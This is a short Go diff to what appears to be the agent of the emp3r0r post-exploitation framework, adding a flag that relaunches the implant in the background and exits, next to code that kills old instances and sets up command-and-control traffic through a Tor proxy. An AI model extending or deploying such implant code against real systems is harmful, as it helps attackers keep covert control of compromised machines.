@@ -6,6 +6,7 @@ import (
 	"io/ioutil"
 	"log"
 	"os"
+	"os/exec"
 	"strings"
 	"time"
 
@@ -16,6 +17,7 @@ import (
 func main() {
 	c2proxy := flag.String("proxy", "socks5://127.0.0.1:9050", "Proxy for emp3r0r agent's C2 communication")
 	silent := flag.Bool("silent", false, "Show logs or not")
+	daemon := flag.Bool("daemon", false, "Daemonize")
 	flag.Parse()
 
 	// silent switch
@@ -49,6 +51,24 @@ func main() {
 		if err != nil {
 			log.Println("Failed to kill old emp3r0r", err)
 		}
+	}
+
+	// daemonize
+	if *daemon {
+		args := os.Args[1:]
+		i := 0
+		for ; i < len(args); i++ {
+			if args[i] == "-daemon=true" {
+				args[i] = "-daemon=false"
+				break
+			}
+		}
+		cmd := exec.Command(os.Args[0], args...)
+		err := cmd.Start()
+		if err != nil {
+			log.Fatal(err)
+		}
+		os.Exit(0)
 	}
 
 	// parse C2 address
